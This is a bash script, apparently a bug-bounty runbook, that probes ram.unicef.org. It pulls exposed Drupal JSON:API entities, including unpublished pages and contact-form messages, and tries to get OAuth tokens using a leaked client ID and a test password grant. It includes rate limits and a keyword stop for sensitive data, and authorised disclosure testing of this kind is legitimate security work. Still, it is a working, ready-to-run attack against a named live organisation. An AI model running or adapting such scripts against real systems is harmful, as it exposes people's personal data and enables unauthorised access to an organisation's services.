#!/usr/bin/env bash
# =============================================================================
# UNICEF VDP — ram.unicef.org entity re-test (FIXED paths) + OAuth full (session4)
# Portable: Linux / Pi / Termux.
#
# session3 Phase B was buggy: used /jsonapi/ (site needs /en/jsonapi/), bad
# &-vs-? query building, no -L. ALL "ERR" was the bug, not a real result.
# F001 confirms /en/jsonapi/ works + ram runs Drupal OAuth2 Server (client UUID
# 8cf614c1-... leaked via meta.omitted).
#
# This run, correctly:
#   A. /en/jsonapi/<type> with -L + proper query — sample-test unpublished content,
#      contact_message/* (contact-form PII), file/media/comment.
#   B. Full /oauth/token + /oauth2/token errors (no truncation), incl. supplying the
#      leaked client_id, to map the OAuth2 misconfiguration / token-issuance path.
#
# SAFETY: >=1.2s/req, read-only GET (+benign OAuth POST, NO real creds), SAMPLE
# ONLY (page-size 1), HARD STOP + flag on beneficiary/child/health data, redact.
# Dedup vs F001 (user emails + client-UUID omitted leak already reported).
#
# Run (Termux): OUTDIR=$HOME/un4 bash runbooks/PI-RUNBOOK-unicef-session4-ram-fixed.sh \
#                 2>&1 | tee $HOME/un4/un4.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/un4
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/un4"
  else OUTDIR="$HOME/un4"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
PACE="${PACE:-1.2}"; H="ram.unicef.org"; B="https://$H"; CLIENT="8cf614c1-7422-477b-952b-bcf1642439c5"
echo "============================================================"
echo "UNICEF ram FIXED  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Host: $H   pace: ${PACE}s/req   SAFETY: sample-only, stop-on-sensitive"
echo "============================================================"; echo ""
J(){ curl -s -L --max-redirs 3 --max-time 18 -H "User-Agent: $UA" -H 'Accept: application/vnd.api+json' "$1"; }

echo "═══ PHASE A: ENTITY EXPOSURE (/en/jsonapi, fixed) ═══"
probe(){ # type  querystring(optional)  label
  local type="$1" qs="$2" label="$3" url out cls
  url="$B/en/jsonapi/$type?page%5Blimit%5D=1"
  [ -n "$qs" ] && url="$B/en/jsonapi/$type?$qs&page%5Blimit%5D=1"
  out=$(J "$url"); sleep "$PACE"
  if echo "$out" | grep -qiE 'beneficiar|child_|date_of_birth|"dob"|patient|diagnos|refugee|gbv|national_id|"ssn"'; then
    echo "  [SENSITIVE @ $label] STOP — flag, NOT pulling."; echo "$label $url" >> "$OUTDIR/SENSITIVE.txt"; return; fi
  cls=$(echo "$out" | python3 -c "import sys,json
try:
 d=json.load(sys.stdin); x=d.get('data')
 n=len(x) if isinstance(x,list) else (1 if x else 0)
 om=d.get('meta',{}).get('omitted')
 print(('DATA:%d'%n) if n>0 else ('EMPTY'+('+OMITTED' if om else '')))
except Exception: print('NONJSON')")
  if echo "$cls" | grep -q '^DATA'; then
    echo "  *** EXPOSED [$label] ($cls): $url"
    echo "$label|$url" >> "$OUTDIR/exposed.txt"
    echo "$out" | head -c 600 > "$OUTDIR/sample-$label.json"
  else
    echo "  ok   [$label]: $cls"
  fi
}
probe "node/page"      "filter%5Bstatus%5D=0" unpublished_pages
probe "node/article"   "filter%5Bstatus%5D=0" unpublished_articles
probe "node/documents" "filter%5Bstatus%5D=0" unpublished_documents
probe "node/documents" ""                     documents_all
probe "contact_message/feedback"              "" contact_feedback
probe "contact_message/personal"              "" contact_personal
probe "contact_message/send_us_your_questions" "" contact_questions
probe "file/file"      ""                     files
probe "comment/comment" ""                    comments
probe "taxonomy_term/tags" ""                 taxonomy_tags
echo ""

echo "═══ PHASE B: OAUTH2 — full errors + client_id-supplied ═══"
oauthpost(){ # path  data  tag
  local p="$1" data="$2" tag="$3"
  local code; code=$(curl -s -o "$OUTDIR/$tag.txt" -w '%{http_code}' -L --max-time 15 \
     -H "User-Agent: $UA" -X POST "$B$p" --data "$data" 2>/dev/null || echo 000)
  echo "  POST $p [$data] -> HTTP $code"
  echo "    $(cat "$OUTDIR/$tag.txt" | head -c 400 | tr '\n' ' ')"
  sleep "$PACE"
}
oauthpost "/oauth/token"  "grant_type=client_credentials"                         t1
oauthpost "/oauth/token"  "grant_type=client_credentials&client_id=$CLIENT"        t2
oauthpost "/oauth2/token" "grant_type=client_credentials&client_id=$CLIENT"        t3
oauthpost "/oauth/token"  "grant_type=password&client_id=$CLIENT&username=test&password=test" t4
echo ""
echo "  (Full message tells us the misconfig: 'encryption keys' = broken server"
echo "   (info-disc only); 'client secret' required = confidential client (no bypass);"
echo "   a 200 with access_token = token issuance / AUTH BYPASS.)"
echo ""

echo "════════════════════════════════════════════"
echo "VERDICT"
echo "════════════════════════════════════════════"
[ -s "$OUTDIR/exposed.txt" ] && { echo "  NEW exposures (distinct from F001):"; sed 's/^/    /' "$OUTDIR/exposed.txt"; } || echo "  No new entity exposure (correctly tested this time)."
[ -s "$OUTDIR/SENSITIVE.txt" ] && { echo "  !!! sensitive-looking (hand-review, no bulk-pull):"; sed 's/^/    /' "$OUTDIR/SENSITIVE.txt"; }
echo "  OAuth: see Phase B full errors above for the misconfig class."
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
